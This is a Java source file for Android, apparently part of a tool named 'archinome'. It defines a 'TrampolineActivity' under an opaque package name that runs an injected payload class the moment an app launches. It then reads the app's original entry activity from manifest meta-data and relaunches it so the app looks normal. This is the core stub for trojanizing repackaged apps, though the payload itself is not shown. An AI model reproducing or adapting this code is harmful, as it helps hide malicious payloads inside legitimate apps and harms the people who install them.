package aaaaaaaaaaaa;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;

public class TrampolineActivity extends Activity {
    private static final String TARGET_KEY_PREFIX = "archinome.target:";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        // 1. payload
        new payload().executePayload();

        // 2. read original target activity from meta-data. Two encodings are
        // supported: android:value="<class>" (legacy) and a key-only variant
        // "archinome.target:<class>" — the latter needs no android:value
        // attribute, which the host resource map may not contain.
        String target = null;
        try {
            ActivityInfo ai = getPackageManager().getActivityInfo(
                    getComponentName(), PackageManager.GET_META_DATA);
            if (ai.metaData != null) {
                target = ai.metaData.getString("archinome.target");
                if (target == null || target.isEmpty()) {
                    for (String k : ai.metaData.keySet()) {
                        if (k != null && k.startsWith(TARGET_KEY_PREFIX)) {
                            target = k.substring(TARGET_KEY_PREFIX.length());
                            break;
                        }
                    }
                }
            }
        } catch (Throwable t) {
            Log.w("ARCHINOME", "TRAMPOLINE_METADATA_READ_FAILED", t);
        }

        if (target == null || target.isEmpty()) {
            Log.e("ARCHINOME", "TRAMPOLINE_TARGET_MISSING");
            finish();
            return;
        }

        // 3. relaunch the original entry activity
        Log.i("ARCHINOME", "TRAMPOLINE_LAUNCHING_TARGET: " + target);
        Intent i = new Intent().setClassName(getPackageName(), target);
        startActivity(i);
        finish();
    }
}
